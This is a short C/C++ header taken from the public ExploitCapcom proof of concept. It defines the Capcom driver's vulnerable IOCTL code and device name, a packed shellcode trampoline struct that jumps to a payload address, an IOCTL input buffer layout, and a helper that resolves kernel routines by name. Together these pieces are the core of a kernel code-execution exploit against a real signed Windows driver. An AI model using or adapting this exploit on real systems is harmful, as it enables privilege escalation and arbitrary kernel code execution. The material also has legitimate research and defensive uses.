#pragma once
//
// https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp
//

#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

static const DWORD CAPCOM_IOCTL = 0xaa013044;
static const char *CAPCOM_DEVICE = "\\\\.\\Htsysm72FB";
static const char *CAPCOM_SERVICE = "CAPCOM";

#include <pshpack1.h>
typedef struct _SHELLCODE
{
	BYTE Nop[1];
	BYTE Sti[1];
	BYTE Jmp[6];
	void *PayloadAddress;
} SHELLCODE, *PSHELLCODE;
#include <poppack.h>

typedef struct _IOCTL_IN_BUFFER
{
	void *ShellcodeAddress;
	SHELLCODE Shellcode;
} IOCTL_IN_BUFFER, *PIOCTL_IN_BUFFER;

static FARPROC get_routine(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress, const wchar_t *RoutineName)
{
	UNICODE_STRING RoutineNameU = { 0 };
	RtlInitUnicodeString(&RoutineNameU, RoutineName);
	return (FARPROC)pMmGetSystemRoutineAddress(&RoutineNameU);
}